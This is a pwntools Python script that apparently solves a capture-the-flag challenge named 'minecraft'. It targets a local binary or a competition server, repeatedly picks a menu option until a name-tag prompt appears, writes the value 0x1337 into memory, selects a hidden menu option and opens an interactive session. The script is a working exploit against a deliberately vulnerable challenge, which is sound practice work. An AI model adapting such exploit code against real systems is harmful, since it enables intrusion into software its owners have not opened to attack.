#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./minecraft"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "minecraft.chal.cyberjousting.com"
  PORT = 1354
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  
s.sendlineafter(b"now: \n", b"A"*4)

while True:
  s.sendlineafter(b"6. Leave\n", b"3")
  r = s.recvuntil(b"\n")
  if r == b"You have received a Name Tag! Please input your first and last name:\n":
    break

s.sendline(b"B"*4)
s.sendline(p64(0x1337))    

s.sendlineafter(b"6. Leave\n", b"3")

s.sendlineafter(b"6. Leave\n", b"1")
s.sendlineafter(b"now: \n", b"C"*4)

s.sendlineafter(b"6. Leave\n", b"7")
  
s.interactive()   
